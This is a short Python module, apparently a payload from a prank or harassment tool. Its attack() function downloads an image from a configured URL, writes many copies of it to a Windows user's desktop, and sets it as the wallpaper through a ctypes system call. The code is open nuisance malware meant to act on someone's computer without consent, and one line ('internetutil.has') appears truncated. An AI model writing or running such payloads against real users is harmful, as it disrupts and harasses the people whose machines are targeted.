import backend.config as config
import backend.paths as paths
import requests
import platform
import utils.internetutil as internetutil

success = False
file_config = {}
image = None

def reload():
    global file_config, success, image

    file_config = config.get("file")
    success = platform.system().lower() == "windows" and internetutil.has  
    try:
        image = requests.get(file_config["url"], stream=True).content
    except Exception as e: 
        success = False
            
def attack():
    global success
    if not success:
        print('Operating System not supported or is without internet!')
        return
    
    global file_config, image
        
    def name(index):
        return paths.desktop(file_config["output_name"]+f' ({index}).png')
        
    for i in range(config.get("files_range")):
        with open(name(i), 'wb') as f:
            f.write(image)

    import ctypes
    ctypes.windll.user32.SystemParametersInfoW(20, 0, name(0), 0)  